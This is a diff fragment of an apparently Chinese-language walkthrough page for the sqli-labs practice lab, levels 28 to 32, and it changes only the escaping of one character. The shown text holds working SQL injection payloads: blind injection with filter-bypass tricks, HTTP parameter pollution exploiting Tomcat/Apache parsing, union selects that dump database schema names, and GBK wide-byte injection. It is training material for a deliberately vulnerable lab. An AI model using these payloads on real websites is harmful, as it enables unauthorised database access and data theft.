@@ -135,7 +135,7 @@ Your Referer is: http://localhost:8081/Less-19/
 </code></pre><h3 id=less-28>Less-28</h3><p><code>union select</code>大小写均被过滤，但是<code>select</code>还可单独用，盲注即可</p><pre tabindex=0><code>0&#39;)||left(database(),1)&gt;&#39;s&#39;;%00
 </code></pre><h3 id=less-28a>Less-28a</h3><p>依然可以用盲注</p><pre tabindex=0><code>0&#39;)||left((database()),1)=&#39;s&#39;;%00
 0&#39;)||left((selEct%0agroup_concat(schema_name)%0afrom%0Ainformation_schema.schemata),1)&lt;&#39;s&#39;;%00
-</code></pre><h3 id=less-29>Less-29</h3><p>利用<code>tomcat</code>与<code>apache</code>解析相同请求参数不同的特性，<code>tomcat</code>解析相同请求参数取第一个，而<code>apache</code>取第二个，如<code>?id=1&id=2</code>，<code>tomcat</code>取得1，<code>apache</code>取得2</p><pre tabindex=0><code>?id=1&amp;id=0&#39; union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23
+</code></pre><h3 id=less-29>Less-29</h3><p>利用<code>tomcat</code>与<code>apache</code>解析相同请求参数不同的特性，<code>tomcat</code>解析相同请求参数取第一个，而<code>apache</code>取第二个，如<code>?id=1&amp;id=2</code>，<code>tomcat</code>取得1，<code>apache</code>取得2</p><pre tabindex=0><code>?id=1&amp;id=0&#39; union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23
 </code></pre><h3 id=less-30>Less-30</h3><p>与 29 架构一样，原理一致只不过加了<code>"</code>限制</p><pre tabindex=0><code>?id=1&amp;id=0&#34; union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23
 </code></pre><h3 id=less-31>Less-31</h3><p>架构一样，多了<code>")</code></p><pre tabindex=0><code>?id=1&amp;id=0&#34;) union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23
 </code></pre><h3 id=less-32>Less-32</h3><p>注意是<code>GBK</code>，可以用<code>%df</code>进行宽字节注入</p><pre tabindex=0><code>0%df%27%20or%201=1%23
